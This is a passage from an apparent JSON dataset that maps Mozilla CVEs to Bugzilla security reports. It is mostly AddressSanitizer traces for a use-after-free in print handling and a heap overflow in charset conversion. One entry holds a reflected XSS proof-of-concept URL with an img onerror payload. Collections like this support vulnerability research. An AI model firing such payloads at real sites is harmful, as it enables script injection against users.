        "description": "Install FuzzPriv extension to help in invoking print. https://www.squarefree.com/extensions/domFuzzLite3.xpi Load testcase, wait like 10 sec and then press Escape once or twice. DOMFuzzHelper created DOMFuzzHelper created DOMFuzzHelper created DOMFuzzHelper created Printing to: /tmp/j1/fuzzout.pdf DOMFuzzHelper created Printing to: /tmp/j1/fuzzout.pdf DOMFuzzHelper created Printing to: /tmp/j1/fuzzout.pdf DOMFuzzHelper created Printing to: /tmp/j1/fuzzout.pdf DOMFuzzHelper created Printing to: /tmp/j1/fuzzout.pdf ================================================================= ==12857== ERROR: AddressSanitizer: heap-use-after-free on address 0x7f1b334eae80 at pc 0x7f1b5125a230 bp 0x7fff0a62af30 sp 0x7fff0a62af28 READ of size 8 at 0x7f1b334eae80 thread T0 #0 0x7f1b5125a22f in nsPrintEngine::CommonPrint(bool, nsIPrintSettings*, nsIWebProgressListener*, nsIDOMDocument*) src/layout/printing/nsPrintEngine.cpp:427 #1 0x7f1b4f94a398 in nsDocumentViewer::Print(nsIPrintSettings*, nsIWebProgressListener*) src/layout/base/nsDocumentViewer.cpp:3666 #2 0x7f1b52a9f836 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #3 0x7f1b5181ba43 in Invoke src/js/xpconnect/src/XPCWrappedNative.cpp:3081 #4 0x7f1b5181ba43 in CallMethodHelper src/js/xpconnect/src/XPCWrappedNative.cpp:2415 #5 0x7f1b5181ba43 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) src/js/xpconnect/src/XPCWrappedNative.cpp:2381 #6 0x7f1b51830018 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1488 #7 0x7f1b53da19dd in native src/js/src/jscntxtinlines.h:372 #8 0x7f1b53da19dd in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:389 #9 0x7f1b53d91dd1 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2348 #10 0x7f1b53d7d8ee in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) src/js/src/jsinterp.cpp:346 #11 0x7f1b53da18d8 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:404 #12 0x7f1b53da2792 in Invoke src/js/src/jsinterp.h:112 #13 0x7f1b53da2792 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:437 #14 0x7f1b53c56e27 in JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*) src/js/src/jsapi.cpp:5791 #15 0x7f1b51807285 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJSClass.cpp:1432 #16 0x7f1b517f610d in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJS.cpp:581 #17 0x7f1b52aa09ea in PrepareAndDispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 #18 0x7f1b52a9fa42 in SharedStub #19 0x7f1b52a5fb5f in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:627 #20 0x7f1b52997522 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:237 #21 0x7f1b51bb0966 in nsXULWindow::ShowModal() src/xpfe/appshell/src/nsXULWindow.cpp:366 #22 0x7f1b51b0ad3a in nsWindowWatcher::OpenWindowInternal(nsIDOMWindow*, char const*, char const*, char const*, bool, bool, bool, nsIArray*, nsIDOMWindow**) src/embedding/components/windowwatcher/src/nsWindowWatcher.cpp:1072 #23 0x7f1b51b03da2 in nsWindowWatcher::OpenWindow(nsIDOMWindow*, char const*, char const*, char const*, nsISupports*, nsIDOMWindow**) src/embedding/components/windowwatcher/src/nsWindowWatcher.cpp:404 #24 0x7f1b52a9f836 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #25 0x7f1b5181ba43 in Invoke src/js/xpconnect/src/XPCWrappedNative.cpp:3081 #26 0x7f1b5181ba43 in CallMethodHelper src/js/xpconnect/src/XPCWrappedNative.cpp:2415 #27 0x7f1b5181ba43 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) src/js/xpconnect/src/XPCWrappedNative.cpp:2381 #28 0x7f1b51830018 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1488 #29 0x7f1b53da19dd in native src/js/src/jscntxtinlines.h:372 #30 0x7f1b53da19dd in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:389 #31 0x7f1b53d91dd1 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2348 #32 0x7f1b53d7d8ee in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) src/js/src/jsinterp.cpp:346 #33 0x7f1b53da18d8 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:404 #34 0x7f1b53da2792 in Invoke src/js/src/jsinterp.h:112 #35 0x7f1b53da2792 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:437 #36 0x7f1b53c56e27 in JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*) src/js/src/jsapi.cpp:5791 #37 0x7f1b51807285 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJSClass.cpp:1432 #38 0x7f1b517f610d in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJS.cpp:581 #39 0x7f1b52aa09ea in PrepareAndDispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 #40 0x7f1b52a9fa42 in SharedStub #41 0x7f1b5125e6e2 in nsPrintEngine::ShowPrintErrorDialog(tag_nsresult, bool) src/layout/printing/nsPrintEngine.cpp:1632 #42 0x7f1b5125a18d in nsPrintEngine::CommonPrint(bool, nsIPrintSettings*, nsIWebProgressListener*, nsIDOMDocument*) src/layout/printing/nsPrintEngine.cpp:426 #43 0x7f1b4f94a398 in nsDocumentViewer::Print(nsIPrintSettings*, nsIWebProgressListener*) src/layout/base/nsDocumentViewer.cpp:3666 #44 0x7f1b52a9f836 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #45 0x7f1b5181ba43 in Invoke src/js/xpconnect/src/XPCWrappedNative.cpp:3081 #46 0x7f1b5181ba43 in CallMethodHelper src/js/xpconnect/src/XPCWrappedNative.cpp:2415 #47 0x7f1b5181ba43 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) src/js/xpconnect/src/XPCWrappedNative.cpp:2381 #48 0x7f1b51830018 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1488 #49 0x7f1b53da19dd in native src/js/src/jscntxtinlines.h:372 #50 0x7f1b53da19dd in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:389 #51 0x7f1b53d91dd1 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2348 #52 0x7f1b53d7d8ee in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) src/js/src/jsinterp.cpp:346 #53 0x7f1b53da18d8 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:404 #54 0x7f1b53da2792 in Invoke src/js/src/jsinterp.h:112 #55 0x7f1b53da2792 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:437 #56 0x7f1b53c56e27 in JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*) src/js/src/jsapi.cpp:5791 #57 0x7f1b51807285 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJSClass.cpp:1432 #58 0x7f1b517f610d in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJS.cpp:581 #59 0x7f1b52aa09ea in PrepareAndDispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 #60 0x7f1b52a9fa42 in SharedStub #61 0x7f1b52a5fb5f in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:627 #62 0x7f1b52997522 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:237 #63 0x7f1b52480b9c in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #64 0x7f1b52aee318 in RunInternal src/ipc/chromium/src/base/message_loop.cc:215 #65 0x7f1b52aee318 in RunHandler src/ipc/chromium/src/base/message_loop.cc:208 #66 0x7f1b52aee318 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:182 #67 0x7f1b5217bbcd in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #68 0x7f1b4f104adf in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3891 #69 0x7f1b4f105aba in XRE_main src/toolkit/xre/nsAppRunner.cpp:4089 #70 0x4097bd in do_main src/browser/app/nsBrowserApp.cpp:174 #71 0x4097bd in main src/browser/app/nsBrowserApp.cpp:279 #72 0x7f1b5895076c in 0x7f1b334eae80 is located 64 bytes inside of 128-byte region [0x7f1b334eae40,0x7f1b334eaec0) freed by thread T0 here: #0 0x4265e0 in __interceptor_free #1 0x7f1b51258f62 in operator= src/../../dist/include/mozilla/mozalloc.h:224 #2 0x7f1b51258f62 in nsPrintEngine::Release() src/layout/printing/nsPrintEngine.cpp:222 #3 0x7f1b4f93bd67 in nsDocumentViewer::Show() src/layout/base/nsDocumentViewer.cpp:1938 #4 0x7f1b4f996957 in nsPresContext::EnsureVisible() src/layout/base/nsPresContext.cpp:1829 #5 0x7f1b4f9bc284 in PresShell::UnsuppressAndInvalidate() src/layout/base/nsPresShell.cpp:3579 #6 0x7f1b51a17d24 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, tag_nsresult) src/docshell/base/nsDocShell.cpp:6514 #7 0x7f1b51a15018 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) src/docshell/base/nsDocShell.cpp:6342 #8 0x7f1b51a154ac in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) src/docshell/base/nsDocShell.cpp:6349 #9 0x7f1b51a74a42 in nsDocLoader::doStopDocumentLoad(nsIRequest*, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:885 #10 0x7f1b51a72ab7 in nsDocLoader::DocLoaderIsEmpty(bool) src/uriloader/base/nsDocLoader.cpp:775 #11 0x7f1b51a73e5b in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:659 #12 0x7f1b51a74659 in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:663 #13 0x7f1b500f7622 in nsDocument::DoUnblockOnload() src/content/base/src/nsDocument.cpp:6972 #14 0x7f1b500dec17 in nsDocument::DispatchContentLoadedEvents() src/content/base/src/nsDocument.cpp:4220 #15 0x7f1b50114586 in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() src/../../../dist/include/nsThreadUtils.h:367 previously allocated by thread T0 here: #0 0x4266a0 in malloc #1 0x7f1b56b1b148 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 #2 0x7f1b52a9f836 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #3 0x7f1b5181ba43 in Invoke src/js/xpconnect/src/XPCWrappedNative.cpp:3081 #4 0x7f1b5181ba43 in CallMethodHelper src/js/xpconnect/src/XPCWrappedNative.cpp:2415 #5 0x7f1b5181ba43 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) src/js/xpconnect/src/XPCWrappedNative.cpp:2381 #6 0x7f1b51830018 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1488 #7 0x7f1b53da19dd in native src/js/src/jscntxtinlines.h:372 #8 0x7f1b53da19dd in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:389 #9 0x7f1b53d91dd1 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2348 #10 0x7f1b53d7d8ee in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) src/js/src/jsinterp.cpp:346 #11 0x7f1b53da18d8 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:404 Shadow byte and word: 0x1fe36669d5d0: fd 0x1fe36669d5d0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe36669d5b0: 00 00 00 00 00 00 fb fb 0x1fe36669d5b8: fa fa fa fa fa fa fa fa 0x1fe36669d5c0: fa fa fa fa fa fa fa fa 0x1fe36669d5c8: fd fd fd fd fd fd fd fd =>0x1fe36669d5d0: fd fd fd fd fd fd fd fd 0x1fe36669d5d8: fa fa fa fa fa fa fa fa 0x1fe36669d5e0: fa fa fa fa fa fa fa fa 0x1fe36669d5e8: fd fd fd fd fd fd fd fd 0x1fe36669d5f0: fd fd fd fd fd fd fd fd Stats: 144M malloced (143M for red zones) by 461053 calls Stats: 11M realloced by 45165 calls Stats: 117M freed by 318690 calls Stats: 82M really freed by 244573 calls Stats: 175M (44883 full pages) mmaped in 332 calls mmaps by size class: 7:180180; 8:55269; 9:16368; 10:7665; 11:4845; 12:2560; 13:832; 14:416; 15:208; 16:728; 17:148; 18:14; 19:6; 20:8; 21:3; mallocs by size class: 7:316387; 8:89162; 9:27422; 10:11100; 11:8505; 12:4084; 13:1726; 14:801; 15:301; 16:1316; 17:202; 18:24; 19:8; 20:12; 21:3; frees by size class: 7:221395; 8:57159; 9:19982; 10:7245; 11:6176; 12:2957; 13:1511; 14:656; 15:190; 16:1190; 17:194; 18:18; 19:6; 20:8; 21:3; rfrees by size class: 7:174666; 8:43529; 9:11861; 10:5716; 11:4350; 12:1749; 13:1116; 14:492; 15:152; 16:753; 17:169; 18:10; 19:2; 20:5; 21:3; Stats: malloc large: 1866 small slow: 4648 ==12857== ABORTING"
      }
    ],
    "CVE-2013-0782": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=827070",
        "title": "Heap-buffer-overflow WRITE in nsSaveAsCharset::DoCharsetConversion",
        "description": ">==26942== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f83dca1bf36 at pc 0x7f840030e916 bp 0x7fffae650e90 sp 0x7fffae650e88 >WRITE of size 1 at 0x7f83dca1bf36 thread T0 > #0 0x7f840030e915 in nsSaveAsCharset::DoCharsetConversion(unsigned short const*, char**) src/intl/unicharutil/src/nsSaveAsCharset.cpp:193 > #1 0x7f840030b29e in nsSaveAsCharset::Convert(unsigned short const*, char**) src/intl/unicharutil/src/nsSaveAsCharset.cpp:103 > #2 0x7f8403c06bcb in nsEncodingFormSubmission::EncodeVal(nsAString_internal const&, nsCString&, bool) src/content/html/content/src/nsFormSubmission.cpp:734 > #3 0x7f8403c00320 in nsFSURLEncoded::URLEncode(nsAString_internal const&, nsCString&) src/content/html/content/src/nsFormSubmission.cpp:365 > #4 0x7f8403bff468 in nsFSURLEncoded::AddNameValuePair(nsAString_internal const&, nsAString_internal const&) src/content/html/content/src/nsFormSubmission.cpp:130 > #5 0x7f840480efe5 in nsHTMLTextAreaElement::SubmitNamesValues(nsFormSubmission*) src/content/html/content/src/nsHTMLTextAreaElement.cpp:1052 > #6 0x7f840480f329 in non-virtual thunk to nsHTMLTextAreaElement::SubmitNamesValues(nsFormSubmission*) src/content/html/content/src/nsHTMLTextAreaElement.cpp:1053 > #7 0x7f8403ee7344 in nsHTMLFormElement::WalkFormElements(nsFormSubmission*) src/content/html/content/src/nsHTMLFormElement.cpp:998 > #8 0x7f8403ee2fbc in nsHTMLFormElement::BuildSubmission(nsFormSubmission**, nsEvent*) src/content/html/content/src/nsHTMLFormElement.cpp:779 > #9 0x7f8403ee1c16 in nsHTMLFormElement::DoSubmit(nsEvent*) src/content/html/content/src/nsHTMLFormElement.cpp:713 > #10 0x7f8403edaf47 in nsHTMLFormElement::DoSubmitOrReset(nsEvent*, int) src/content/html/content/src/nsHTMLFormElement.cpp:664 > #11 0x7f8403eda6e1 in nsHTMLFormElement::Submit() src/content/html/content/src/nsHTMLFormElement.cpp:396 > #12 0x7f8403edb1b3 in non-virtual thunk to nsHTMLFormElement::Submit() src/content/html/content/src/nsHTMLFormElement.cpp:398 > #13 0x7f8408bace47 in nsIDOMHTMLFormElement_Submit(JSContext*, unsigned int, JS::Value*) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:4656 > #14 0x7f8415f7e665 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:373 > #15 0x7f8415f7e665 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:391 > #16 0x7f8415f2a081 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2367 > #17 0x7f8415e89bab in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) src/js/src/jsinterp.cpp:348 > #18 0x7f8415f8be85 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:537 > #19 0x7f8415f8da25 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:576 > #20 0x7f84156e531e in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5621 > #21 0x7f84052ca270 in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1525 > #22 0x7f8402f0b0d3 in nsScriptLoader::EvaluateScript(nsScriptLoadRequest*, nsString const&) src/content/base/src/nsScriptLoader.cpp:859 > #23 0x7f8402f085fe in nsScriptLoader::ProcessRequest(nsScriptLoadRequest*) src/content/base/src/nsScriptLoader.cpp:757 > #24 0x7f8402f034d4 in nsScriptLoader::ProcessScriptElement(nsIScriptElement*) src/content/base/src/nsScriptLoader.cpp:705 > #25 0x7f8402ef4226 in nsScriptElement::MaybeProcessScript() src/content/base/src/nsScriptElement.cpp:139 > #26 0x7f8404b115a8 in nsIScriptElement::AttemptToExecute() src/../../dist/include/nsIScriptElement.h:220 > #27 0x7f84068777d8 in nsHtml5TreeOpExecutor::RunScript(nsIContent*) src/parser/html/nsHtml5TreeOpExecutor.cpp:791 > #28 0x7f840687467f in nsHtml5TreeOpExecutor::RunFlushLoop() src/parser/html/nsHtml5TreeOpExecutor.cpp:595 > #29 0x7f84068b21fd in nsHtml5ExecutorFlusher::Run() src/parser/html/nsHtml5StreamParser.cpp:127 > #30 0x7f840e44dc3f in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:627 > #31 0x7f840e0c2495 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:237 > #32 0x7f840baf8adc in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 > #33 0x7f840e73f5f2 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:215 > #34 0x7f840e73f429 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:208 > #35 0x7f840e73f2fe in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:182 > #36 0x7f840aeeb317 in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 > #37 0x7f8409a17575 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:288 > #38 0x7f83fec61284 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3823 > #39 0x7f83fec66e6a in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3890 > #40 0x7f83fec69c30 in XRE_main src/toolkit/xre/nsAppRunner.cpp:4088 > #41 0x41dad6 in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 > #42 0x41b2f0 in main src/browser/app/nsBrowserApp.cpp:279 > #43 0x7f842023976c in >0x7f83dca1bf36 is located 0 bytes to the right of 694-byte region [0x7f83dca1bc80,0x7f83dca1bf36) >allocated by thread T0 here: > #0 0x40fd17 in __interceptor_realloc > #1 0x7f841f48b208 in PR_Realloc src/nsprpub/pr/src/malloc/prmem.c:450 > #2 0x7f840030cb59 in nsSaveAsCharset::HandleFallBack(unsigned int, char**, int*, int*, int) src/intl/unicharutil/src/nsSaveAsCharset.cpp:147 > #3 0x7f840030fdd2 in nsSaveAsCharset::DoCharsetConversion(unsigned short const*, char**) src/intl/unicharutil/src/nsSaveAsCharset.cpp:227 > #4 0x7f840030b29e in nsSaveAsCharset::Convert(unsigned short const*, char**) src/intl/unicharutil/src/nsSaveAsCharset.cpp:103 > #5 0x7f8403c06bcb in nsEncodingFormSubmission::EncodeVal(nsAString_internal const&, nsCString&, bool) src/content/html/content/src/nsFormSubmission.cpp:734 > #6 0x7f8403c00320 in nsFSURLEncoded::URLEncode(nsAString_internal const&, nsCString&) src/content/html/content/src/nsFormSubmission.cpp:365 > #7 0x7f8403bff468 in nsFSURLEncoded::AddNameValuePair(nsAString_internal const&, nsAString_internal const&) src/content/html/content/src/nsFormSubmission.cpp:130 > #8 0x7f840480efe5 in nsHTMLTextAreaElement::SubmitNamesValues(nsFormSubmission*) src/content/html/content/src/nsHTMLTextAreaElement.cpp:1052 > #9 0x7f840480f329 in non-virtual thunk to nsHTMLTextAreaElement::SubmitNamesValues(nsFormSubmission*) src/content/html/content/src/nsHTMLTextAreaElement.cpp:1053 > #10 0x7f8403ee7344 in nsHTMLFormElement::WalkFormElements(nsFormSubmission*) src/content/html/content/src/nsHTMLFormElement.cpp:998 > #11 0x7f8403ee2fbc in nsHTMLFormElement::BuildSubmission(nsFormSubmission**, nsEvent*) src/content/html/content/src/nsHTMLFormElement.cpp:779 > #12 0x7f8403ee1c16 in nsHTMLFormElement::DoSubmit(nsEvent*) src/content/html/content/src/nsHTMLFormElement.cpp:713 > #13 0x7f8403edaf47 in nsHTMLFormElement::DoSubmitOrReset(nsEvent*, int) src/content/html/content/src/nsHTMLFormElement.cpp:664 > #14 0x7f8403eda6e1 in nsHTMLFormElement::Submit() src/content/html/content/src/nsHTMLFormElement.cpp:396 > #15 0x7f8403edb1b3 in non-virtual thunk to nsHTMLFormElement::Submit() src/content/html/content/src/nsHTMLFormElement.cpp:398 > #16 0x7f8408bace47 in nsIDOMHTMLFormElement_Submit(JSContext*, unsigned int, JS::Value*) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:4656 > #17 0x7f8415f7e665 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:373 > #18 0x7f8415f7e665 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:391 > #19 0x7f8415f2a081 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2367 > #20 0x7f8415e89bab in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) src/js/src/jsinterp.cpp:348 > #21 0x7f8415f8be85 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:537 > #22 0x7f8415f8da25 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:576 > #23 0x7f84156e531e in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5621 > #24 0x7f84052ca270 in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1525 > #25 0x7f8402f0b0d3 in nsScriptLoader::EvaluateScript(nsScriptLoadRequest*, nsString const&) src/content/base/src/nsScriptLoader.cpp:859 >Shadow bytes around the buggy address: > 0x1ff07b943790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x1ff07b9437a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x1ff07b9437b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x1ff07b9437c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x1ff07b9437d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >=>0x1ff07b9437e0: 00 00 00 00 00 00[06]fb fb fb fb fb fb fb fb fb > 0x1ff07b9437f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1ff07b943800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1ff07b943810: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1ff07b943820: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x1ff07b943830: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa >Shadow byte legend (one shadow byte represents 8 application bytes): > Addressable: 00 > Partially addressable: 01 02 03 04 05 06 07 > Heap left redzone: fa > Heap righ redzone: fb > Freed Heap region: fd > Stack left redzone: f1 > Stack mid redzone: f2 > Stack right redzone: f3 > Stack partial redzone: f4 > Stack after return: f5 > Stack use after scope: f8 > Global redzone: f9 > Global init order: f6 > Poisoned by user: f7 > ASan internal: fe >Stats: 246M malloced (267M for red zones) by 396769 calls >Stats: 46M realloced by 23752 calls >Stats: 213M freed by 267399 calls >Stats: 79M really freed by 187724 calls >Stats: 464M (464M-0M) mmaped; 116 maps, 0 unmaps > mmaps by size class: 8:294894; 9:32764; 10:8190; 11:12282; 12:2048; 13:1536; 14:1280; 15:384; 16:1152; 17:1312; 18:48; 19:40; 20:24; > mallocs by size class: 8:332060; 9:31374; 10:8623; 11:15688; 12:2433; 13:1698; 14:1587; 15:391; 16:1426; 17:1357; 18:70; 19:40; 20:22; > frees by size class: 8:219567; 9:22423; 10:4961; 11:13499; 12:1444; 13:1211; 14:1418; 15:267; 16:1156; 17:1339; 18:57; 19:38; 20:19; > rfrees by size class: 8:166298; 9:7607; 10:2078; 11:8865; 12:594; 13:509; 14:423; 15:153; 16:968; 17:198; 18:26; 19:4; 20:1; >Stats: malloc large: 1489 small slow: 2310 >Stats: StackDepot: 0 ids; 0M mapped >==26942== ABORTING >"
      }
    ],
    "CVE-2013-0785": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=842038",
        "title": "[SECURITY] XSS in show_bug.cgi when using an invalid page format",
        "description": "User Agent: Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0 Build ID: 20130201065344 Steps to reproduce: Hi, I would like to report Cross site scripting vulnerability. Steps to reproduce : Navigate https://bugzilla.mozilla.org/show_bug.cgi?id=%22%3E%3Cimg%20src=%22aaa.jpg%22%20onerror=javascript:alert%28%27HappyBirthdayDone%27%29%3E&format=123 Actual results: JavaScript get executed. Expected results: Site should not execute the script and should filter metacharacter in order to prevent XSS attacks and Bounty :P"
      }
    ],
    "CVE-2013-0786": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=824399",
        "title": "[SECURITY] build_subselect() leaks the existence of products and components you cannot access",
